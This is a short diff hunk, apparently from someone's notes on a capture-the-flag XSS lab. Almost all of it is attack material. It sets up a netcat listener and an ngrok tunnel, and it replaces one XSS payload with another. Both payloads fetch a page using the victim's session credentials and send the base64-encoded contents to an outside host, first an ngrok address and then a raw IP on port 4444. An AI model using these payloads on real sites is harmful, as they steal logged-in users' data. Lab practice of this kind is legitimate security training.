@@ -103,7 +103,7 @@ sudo nv -lvnp 4443
 ngrok http http://localhost:4443
 
 then xss=> 
-<img src=0 onerror="fetch('https://xssintro.htb/view.php',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://nonrecalcitrant-euphorbiaceous-fredrick.ngrok-free.dev/?d='+btoa(d),{headers:{'ngrok-skip-browser-warning':'1'}}))">
+<img src=0 onerror="fetch('/index.php',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://10.10.16.180:4444/?d='+btoa(unescape(encodeURIComponent(d)))))">
 
 or via the server on the script 
 <script>
